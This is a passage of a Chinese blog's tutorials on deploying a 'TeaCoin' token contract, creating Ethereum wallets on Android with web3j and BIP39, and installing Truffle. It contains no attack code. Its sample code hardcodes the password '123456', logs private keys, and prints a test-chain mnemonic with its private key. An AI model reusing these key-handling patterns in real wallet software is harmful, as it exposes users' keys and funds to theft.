Some wallets/interfaces might not even bother to look at this information.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    string public name;                   <span class="comment">//token名称: TeaCoin </span></span><br><span class="line">    uint8 public decimals;                <span class="comment">//小数位How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.</span></span><br><span class="line">    string public symbol;                 <span class="comment">//标识An identifier: eg SBX</span></span><br><span class="line">    string public version = <span class="string">'H0.1'</span>;       <span class="comment">//版本号human 0.1 standard. Just an arbitrary versioning scheme.</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">TeaToken</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 _initialAmount,</span></span></span><br><span class="line"><span class="function"><span class="params">        string _tokenName,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint8 _decimalUnits,</span></span></span><br><span class="line"><span class="function"><span class="params">        string _tokenSymbol</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>) </span>&#123;</span><br><span class="line">        balances[msg.sender] = _initialAmount;               <span class="comment">// Give the creator all initial tokens</span></span><br><span class="line">        totalSupply = _initialAmount;                        <span class="comment">// Update total supply</span></span><br><span class="line">        name = _tokenName;                                   <span class="comment">// Set the name for display purposes</span></span><br><span class="line">        decimals = _decimalUnits;                            <span class="comment">// Amount of decimals for display purposes</span></span><br><span class="line">        symbol = _tokenSymbol;                               <span class="comment">// Set the symbol for display purposes</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 批准然后调用接收合约 Approves and then calls the receiving contract */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approveAndCall</span>(<span class="params">address _spender, uint256 _value, bytes _extraData</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">        allowed[msg.sender][_spender] = _value;</span><br><span class="line">        Approval(msg.sender, _spender, _value);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用你想要通知合约的 receiveApprovalcall 方法 ，这个方法是可以不需要包含在这个合约里的。 //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData) //假设这么做是可以成功，不然应该调用vanilla approve。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!_spender.call(bytes4(bytes32(sha3(<span class="string">"receiveApproval(address,uint256,address,bytes)"</span>))), msg.sender, _value, <span class="keyword">this</span>, _extraData)) &#123; <span class="keyword">throw</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="编译合约代码"><a href="#编译合约代码" class="headerlink" title="编译合约代码"></a>编译合约代码</h4><p>我们用在线编译器<a href="https://ethereum.github.io" target="_blank" rel="noopener">Solidity Remix Compiler</a></p>
<p>导入我们三个sol文件，一一选中，分别编译。</p>
<p><img src="/images/blockchain/编译合约.png" alt="编译合约.png"></p>
<h4 id="发行-部署-Token的合约代码"><a href="#发行-部署-Token的合约代码" class="headerlink" title="发行(部署)Token的合约代码"></a>发行(部署)Token的合约代码</h4><blockquote>
<p>JavaScript VM：JS虚拟机，通过JS模拟的钱包环境。<br>Injected Web3：使用MetaMask之类的Chrome插件钱包作为调试环境。<br>Web3 Provider：使用eth钱包作为测试环境，如geth。</p>
</blockquote>
<p>Injected Web3，选中Run，可以看到<code>Accout</code>显示的是当前登录在<code>MetaMask</code> 登录的账号，选中我们要发行的<code>TeaToken</code>。</p>
<blockquote>
<p>我们要发行的Token如下：</p>
<p>名称： TeaCoin<br>标识： TMC<br>小数位： 18<br>发行量： 10000</p>
</blockquote>
<p>在Deploy的编辑框输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;10000000000000000000000&quot;,&quot;TeaCoin&quot;,18,&quot;TMC&quot;</span><br></pre></td></tr></table></figure>
<p>点击Deploy就开始部署了，<code>MetaMask</code> 会有确认框弹出，部署成功的话，会有一个合约地址。</p>
<p><img src="/images/blockchain/部署合约.png" alt="部署合约.png"></p>
<p>在 <a href="https://ropsten.etherscan.io" target="_blank" rel="noopener">etherscan</a> 可以查看账号,如 <a href="https://ropsten.etherscan.io/address/0xbcdc478c31bb569afc9ed986e869f62a117a4cae" target="_blank" rel="noopener">oxbc</a> ：</p>
<p><img src="/images/blockchain/合约截图.png" alt="合约截图.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Contract 0x3814e6421417c354c090898ad4ae63c85ffef039</span><br></pre></td></tr></table></figure>
<p><a href="https://ropsten.etherscan.io/address" target="_blank" rel="noopener"> etherscan </a> 也可以查看合约，如 <a href="https://ropsten.etherscan.io/address/0x3814e6421417c354c090898ad4ae63c85ffef039" target="_blank" rel="noopener">TeaCoin</a>：</p>
<p><img src="/images/blockchain/查看合约.png" alt="查看合约.png"></p>
<p>在<code>MetaMask</code> 添加我们的 <code>TeaToken</code>，填入合约地址就可以了，其他两项会自动填充。<br>成功的话，可以看到账号的TMC币的余额就是我们的发行数量。</p>
<p><img src="/images/blockchain/添加token.png" alt="添加token.png"></p>
<h4 id="流通我们的代币"><a href="#流通我们的代币" class="headerlink" title="流通我们的代币"></a>流通我们的代币</h4><p>流通就是将代币从一个账号转移给另一个账号，所以我们通过 <code>MetaMask</code> 再次创建一个账号(<code>0x51A7Da564a85CCaae01822af00330E7A5AEAac6d</code>)。</p>
<p>接下来我们将从账号 <code>oxbc</code> 转 <code>1</code> 个TMC币到账号 <code>ox51</code>。</p>
<p>依然是在Remix的Run中，把合约地址加入进到<code>At Address</code></p>
<p><code>transfer</code> 就是对应我们合约上的transfer函数，可以进行交易。</p>
<p>输入账号ox51的地址和交易的数量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;0x51A7Da564a85CCaae01822af00330E7A5AEAac6d&quot;,&quot;1000000000000000000&quot;</span><br></pre></td></tr></table></figure>
<p>点击<code>transfer</code>，等待交易确认。</p>
<p><img src="/images/blockchain/流通.png" alt="流通.png"></p>
<p>交易确认之后，就能在账号0x51看到有一个TMC币了。</p>
<p><img src="/images/blockchain/账号TMC余额.png" alt="账号TMC余额.png"></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>14、创建/恢复ETH钱包身份</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/14%E3%80%81%E5%88%9B%E5%BB%BA%E6%81%A2%E5%A4%8D%E9%92%B1%E5%8C%85%E8%BA%AB%E4%BB%BD/</url>
    <content><![CDATA[<p>借助网上的一段描述：</p>
<blockquote>
<p>若以银行账户为类比，这 5 个词分别对应内容如下：</p>
<p>地址=银行卡号<br>密码=银行卡密码<br>私钥=银行卡号+银行卡密码<br>助记词=银行卡号+银行卡密码<br>Keystore+密码=银行卡号+银行卡密码<br>Keystore ≠ 银行卡号</p>
</blockquote>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">implementation <span class="string">'org.web3j:core:3.3.1-android'</span></span><br><span class="line">implementation <span class="string">'io.github.novacrypto:BIP39:0.1.9'</span><span class="comment">//用于生成助记词</span></span><br></pre></td></tr></table></figure>
<p><code>org.web3j:core</code> 这个库是Java的，<code>org.web3j:core:x-android</code> 是兼容Android平台，所有接口和工具类都是为Java应用设计的，所以在Android上使用的时候要注意变通一下。</p>
<h3 id="创建数字身份"><a href="#创建数字身份" class="headerlink" title="创建数字身份"></a>创建数字身份</h3><p>创建钱包身份可以通过 WalletUtils 类来实现，它可以创建两种钱包：标准和 BIP39。</p>
<p>可以通过 generateWalletFile 函数创建，直接保存为json文件，以下其他三个函数都是它的封装。</p>
<p><strong>在Android上不建议使用 <code>WalletUtils</code> 的这几个函数创建数字身份。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WalletUtils.generateFullNewWalletFile();</span><br><span class="line">WalletUtils.generateLightNewWalletFile();</span><br><span class="line">WalletUtils.generateNewWalletFile();</span><br><span class="line">WalletUtils.generateWalletFile();</span><br></pre></td></tr></table></figure>
<p>generateFullNewWalletFile 使用N_STANDARD加密强度，在Android上会发送OOM，Android的处理速度也跟不上。</p>
<p>generateLightNewWalletFile 相对来说比较轻量级，但是在我手机（红米4）上也花了21秒才创建完成，而加载为 Credentials 花了40秒。而在一台三星手机跑比较快，7秒左右。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startClickCreateDefault</span><span class="params">(View view)</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		String password = <span class="string">"123456"</span>;</span><br><span class="line">		String path = Environment.getExternalStorageDirectory().getPath() + <span class="string">"/MyWallet"</span>;</span><br><span class="line">		File fileDir = <span class="keyword">new</span> File(path);</span><br><span class="line">		<span class="keyword">if</span> (!fileDir.exists()) &#123;</span><br><span class="line">			fileDir.mkdirs();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//生成钱包身份保存到目录下</span></span><br><span class="line">		String fileName = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">		Log.e(TAG, <span class="string">"startClickCreateDefault: "</span>+fileDir.getPath() );</span><br><span class="line">		fileName = WalletUtils.generateLightNewWalletFile(<span class="string">"123456"</span>,fileDir);</span><br><span class="line"></span><br><span class="line">		Log.e(TAG, <span class="string">"wallet fileName: "</span> + fileName );</span><br><span class="line"></span><br><span class="line">		<span class="comment">//加载钱包身份</span></span><br><span class="line">		Credentials credentials = WalletUtils.loadCredentials(password,path + <span class="string">"/"</span> +fileName);</span><br><span class="line">		Log.e(TAG, <span class="string">"getAddress: "</span>+credentials.getAddress());</span><br><span class="line">		Log.e(TAG, <span class="string">"getPrivateKey: "</span>+credentials.getEcKeyPair().getPrivateKey());</span><br><span class="line">		Log.e(TAG, <span class="string">"getPublicKey: "</span>+credentials.getEcKeyPair().getPublicKey());</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NoSuchProviderException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvalidAlgorithmParameterException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125; <span class="keyword">catch</span> (CipherException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="创建BIP39身份"><a href="#创建BIP39身份" class="headerlink" title="创建BIP39身份"></a>创建BIP39身份</h3><p>可以导出助记词，创建花了43秒，用助记词导入很快，只花了几秒。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WalletUtils.generateBip39Wallet();</span><br></pre></td></tr></table></figure>
<p>WalletUtils提供的这个方法在Android上闪退，只有自己写一个了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startClickCreateBip39</span><span class="params">(View view)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	String password = <span class="string">"123456"</span>;</span><br><span class="line">	String path = Environment.getExternalStorageDirectory().getPath() + <span class="string">"/MyWallet"</span>;</span><br><span class="line">	File fileDir = <span class="keyword">new</span> File(path);</span><br><span class="line">	<span class="keyword">if</span> (!fileDir.exists()) &#123;</span><br><span class="line">		fileDir.mkdirs();</span><br><span class="line">	&#125;</span><br><span class="line">	Log.e(TAG, <span class="string">"wallet start"</span>);</span><br><span class="line">	<span class="comment">//闪退</span></span><br><span class="line">	<span class="comment">//Bip39Wallet wallet = WalletUtils.generateBip39Wallet(password,fileDir);</span></span><br><span class="line">	<span class="comment">//String mnemonic = wallet.getMnemonic();</span></span><br><span class="line">	<span class="comment">//Log.e(TAG, "助记词wallet.getMnemonic(): " + mnemonic);</span></span><br><span class="line">	<span class="comment">//String fileName = wallet.getFilename();</span></span><br><span class="line">	<span class="comment">//Log.e(TAG, "fileName: " + fileName);</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">byte</span>[] entropy = <span class="keyword">new</span> <span class="keyword">byte</span>[Words.TWELVE.byteLength()];</span><br><span class="line">		<span class="keyword">new</span> SecureRandom().nextBytes(entropy);</span><br><span class="line">		<span class="keyword">new</span> MnemonicGenerator(English.INSTANCE).createMnemonic(entropy, sb::append);</span><br><span class="line">		String mnemonic = sb.toString();</span><br><span class="line">		<span class="comment">//String mnemonic = MnemonicUtils.generateMnemonic(initialEntropy);</span></span><br><span class="line">		<span class="keyword">byte</span>[] seed = MnemonicUtils.generateSeed(mnemonic, password);</span><br><span class="line">		ECKeyPair privateKey = ECKeyPair.create(sha256(seed));</span><br><span class="line"></span><br><span class="line">		String fileName = WalletUtils.generateWalletFile(password, privateKey, fileDir, <span class="keyword">false</span>);</span><br><span class="line">		Log.e(TAG, <span class="string">"fileName: "</span> + fileName);</span><br><span class="line">		Log.e(TAG, <span class="string">"助记词wallet.getMnemonic(): "</span> + mnemonic);</span><br><span class="line">		<span class="comment">//加载钱包身份</span></span><br><span class="line">		Credentials credentials = WalletUtils.loadBip39Credentials(password,mnemonic);</span><br><span class="line">		Log.e(TAG, <span class="string">"getAddress: "</span>+credentials.getAddress());</span><br><span class="line">		Log.e(TAG, <span class="string">"getPrivateKey: "</span>+credentials.getEcKeyPair().getPrivateKey());</span><br><span class="line">		Log.e(TAG, <span class="string">"getPublicKey: "</span>+credentials.getEcKeyPair().getPublicKey());</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">catch</span> (CipherException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Android创建钱包"><a href="#Android创建钱包" class="headerlink" title="Android创建钱包"></a>Android创建钱包</h3><p>上面这些感觉比较适合Java程序，我们跳进去看看就知道了，其实生成数字身份的代码是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WalletFile <span class="title">createLight</span><span class="params">(String password, ECKeyPair ecKeyPair)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> CipherException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> create(password, ecKeyPair, N_LIGHT, P_LIGHT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>针对Android，我们需要将生成的数字身份 <code>WalletFile</code> 转为 <code>JSON</code> (Keystore)保存到 <code>SharedPreferences</code> ，所以整理一个工具类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.support.annotation.Nullable;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.CipherException;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.Credentials;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.ECKeyPair;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.Keys;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.MnemonicUtils;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.Wallet;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.WalletFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchProviderException;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.github.novacrypto.bip39.MnemonicGenerator;</span><br><span class="line"><span class="keyword">import</span> io.github.novacrypto.bip39.Words;</span><br><span class="line"><span class="keyword">import</span> io.github.novacrypto.bip39.wordlists.English;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.web3j.crypto.Hash.sha256;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWalletTool</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String TAG = getClass().getName();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个轻量级钱包，没有助记词</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> WalletFile <span class="title">createLightWallet</span><span class="params">(String password)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        WalletFile walletFile = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            walletFile = Wallet.createLight(password, Keys.createEcKeyPair());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CipherException | NoSuchProviderException | NoSuchAlgorithmException | InvalidAlgorithmParameterException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> walletFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个助记词</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">createMnemonic</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">byte</span>[] entropy = <span class="keyword">new</span> <span class="keyword">byte</span>[Words.TWELVE.byteLength()];</span><br><span class="line">        <span class="keyword">new</span> SecureRandom().nextBytes(entropy);</span><br><span class="line">        <span class="keyword">new</span> MnemonicGenerator(English.INSTANCE).createMnemonic(entropy, sb::append);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个带有助记词的轻量级钱包</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mnemonic</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> WalletFile <span class="title">createBip39Wallet</span><span class="params">(String password,String mnemonic)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        WalletFile walletFile = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] seed = MnemonicUtils.generateSeed(mnemonic, password);</span><br><span class="line">            Log.d(TAG, <span class="string">"createLight start..."</span>);</span><br><span class="line">            walletFile = Wallet.createLight(password, ECKeyPair.create(sha256(seed)));</span><br><span class="line">            Log.d(TAG, <span class="string">"createLight end."</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> walletFile;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成凭证</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> walletFile</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> CipherException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Credentials <span class="title">createCredentials</span><span class="params">(String password,String mnemonic)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] seed = MnemonicUtils.generateSeed(mnemonic, password);</span><br><span class="line">        <span class="keyword">return</span> Credentials.create(ECKeyPair.create(sha256(seed)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Credentials <span class="title">createCredentials</span><span class="params">(String password,WalletFile walletFile)</span> <span class="keyword">throws</span> CipherException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Credentials.create(Wallet.decrypt(password, walletFile));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Credentials <span class="title">createCredentials</span><span class="params">(String privateKey)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Credentials.create(privateKey);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="交易凭证Credentials"><a href="#交易凭证Credentials" class="headerlink" title="交易凭证Credentials"></a>交易凭证Credentials</h3><p>在 <code>web3j</code> 中每一个交易都需要一个参数：<code>Credentials</code>，<code>Credentials</code> 实例化有三种方法，其中私钥权限最高，所以绝不能泄露自己的私钥和助记词，常用的是<code>密码 + Keystore</code>。</p>
<p>从<code>MyWalletTool</code>调用的函数来看，交易凭证的实例化只需要以下之一：</p>
<ol>
<li>私钥</li>
<li>助记词</li>
<li>密码 + Keystore</li>
</ol>
<h4 id="私钥"><a href="#私钥" class="headerlink" title="私钥"></a>私钥</h4><blockquote>
<p>一个钱包只有一个私钥且不能修改</p>
</blockquote>
<p>为什么 <code>私钥</code> 单独可以实现实例化 <code>Credentials</code> ？</p>
<p><code>Credentials</code> 的构造函数参数是 <code>ECKeyPair</code> 和 <code>address</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Credentials</span><span class="params">(ECKeyPair ecKeyPair, String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.ecKeyPair = ecKeyPair;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>address</code> 可以通过 <code>ECKeyPair</code> 推导出来，而 <code>ECKeyPair</code> 的构造函数参数就是公钥和私钥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ECKeyPair</span><span class="params">(BigInteger privateKey, BigInteger publicKey)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.privateKey = privateKey;</span><br><span class="line">	<span class="keyword">this</span>.publicKey = publicKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>公钥可以通过私钥推导出来，所以可以直接实例化 <code>Credentials</code>。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Sign.publicKeyFromPrivate(privateKey)</span><br></pre></td></tr></table></figure></p>
<h4 id="助记词"><a href="#助记词" class="headerlink" title="助记词"></a>助记词</h4><blockquote>
<p>助记词是明文私钥的另一种表现形式，其目的是为了帮助用户记忆复杂的私钥</p>
</blockquote>
<p>Canache生成的一个助记词<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">助记词:jump dolphin leave reward allow farm gate hospital region diary seminar loan</span><br><span class="line">地址:0x7E728c371D66813434F340E6D473B212F506bA54</span><br><span class="line">私钥:6229413033912ab1f26e36f0aad7e1ea2b957de73cfedf788b9fff811192aa89</span><br></pre></td></tr></table></figure></p>
<p>用 <code>imToken</code> 可以成功导入钱包，但是用下面的 <code>BIP39</code> 标准的代码却不行(passphrase是加盐，这里为空)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] seed = MnemonicUtils.generateSeed(mnemonic, passphrase);<span class="comment">//passphrase=null</span></span><br><span class="line">ECKeyPair ecKeyPair = ECKeyPair.create(sha256(seed));</span><br><span class="line">System.out.println(<span class="string">"private="</span> + ecKeyPair.getPrivateKey().toString());</span><br><span class="line">System.out.println(<span class="string">"private="</span> + ecKeyPair.getPrivateKey().toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>
<p>结果是:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private=27538423023524426157929608133615570842335693203949154557762660148101331275721</span><br><span class="line">private=3ce231f097447fe5d623b3a1f9a37e8c554ee014959903c4e2ebadf69ac7cfc9</span><br></pre></td></tr></table></figure></p>
<p>网上查资料说 <code>imToken</code> 用的是 <code>BIP44</code> 标准。后面再看看怎么搞，<a href="https://github.com/consenlabs" target="_blank" rel="noopener">imToken核心码开源地址</a></p>
<p><a href="https://blog.csdn.net/qq_27381325/article/details/82685714" target="_blank" rel="noopener">BIP44助记词创建和导入</a></p>
<h4 id="Keystore"><a href="#Keystore" class="headerlink" title="Keystore"></a>Keystore</h4><blockquote>
<p>将私钥以加密的方式保存为一份 JSON 文件，这份 JSON 文件就是 Keystore，所以它就是加密后的私钥，它必须配合钱包密码才能使用该账号。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ECKeyPair ecKeyPair = Wallet.decrypt(password, walletFile);</span><br></pre></td></tr></table></figure>
<h3 id="钱包开源项目"><a href="#钱包开源项目" class="headerlink" title="钱包开源项目"></a>钱包开源项目</h3><ol>
<li><a href="https://github.com/DwyaneQ/ETHWallet" target="_blank" rel="noopener">A ethereum wallet like imToken for Android</a></li>
<li><a href="https://github.com/manuelsc/Lunary-Ethereum-Wallet" target="_blank" rel="noopener">A beautiful, secure and native Ethereum Wallet for Android</a></li>
<li><a href="https://github.com/ConsenSys/eth-lightwallet" target="_blank" rel="noopener">Lightweight JS Wallet for Node and the browser </a></li>
<li><a href="https://github.com/immutability-io/vault-ethereum" target="_blank" rel="noopener">A plugin that turns Vault into an Ethereum wallet. Golang</a></li>
</ol>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>6.0、基于truffle部署HelloWorld合约到私链</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/6.0%E3%80%81%E5%9F%BA%E4%BA%8Etruffle%E9%83%A8%E7%BD%B2HelloWorld%E5%90%88%E7%BA%A6%E5%88%B0%E7%A7%81%E9%93%BE/</url>
    <content><![CDATA[<blockquote>
<p>后来发现 <a href="http://truffle.tryblockchain.org" target="_blank" rel="noopener">文档翻译系列-Truffle框架</a> 文章，摘录：</p>
<p>Truffle是针对基于以太坊的Solidity语言的一套开发框架。本身基于Javascript。 </p>
<p><a href="https://www.trufflesuite.com/docs/truffle/overview" target="_blank" rel="noopener"> Truffle官方文档-英文</a><br><a href="https://truffleframework.org/docs/" target="_blank" rel="noopener"> Truffle官方文档-中文版</a><br><a href="https://learnblockchain.cn/docs/truffle/" target="_blank" rel="noopener"> Truffle中文文档-深入浅出区块链</a></p>
</blockquote>
<h4 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h4><ul>
<li>nodejs</li>
<li>npm</li>
</ul>
<h4 id="启动-ganache-cli-或者-ganache-gui"><a href="#启动-ganache-cli-或者-ganache-gui" class="headerlink" title="启动 ganache-cli 或者 ganache-gui"></a>启动 ganache-cli 或者 ganache-gui</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">本文采用 cli</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ganache-cli</span></span><br></pre></td></tr></table></figure>
<h4 id="安装truffle环境"><a href="#安装truffle环境" class="headerlink" title="安装truffle环境"></a>安装truffle环境</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g solc-js</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install -g truffle</span></span><br></pre></td></tr></table></figure>
<p>指定版本<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g solc-js@0.5.0</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install -g truffle@5.0.24</span></span><br></pre></td></tr></table></figure></p>
<p><strong> 注意：在Ubuntu下安装truffle</strong> ，很容易出现 <code>Error: EACCES: permission denied</code>，怎么修改文件的目录权限都不行，这个是npm的错误，可以增加以下参数执行：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo npm install -g truffle@5.0.24 --unsafe-perm=<span class="literal">true</span> --allow-root</span><br></pre></td></tr></table></figure></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> truffle version</span></span><br><span class="line">Truffle v5.0.24 (core: 5.0.24)</span><br><span class="line">Solidity v0.5.0 (solc-js)</span><br><span class="line">Node v8.10.0</span><br></pre></td></tr></table></figure>
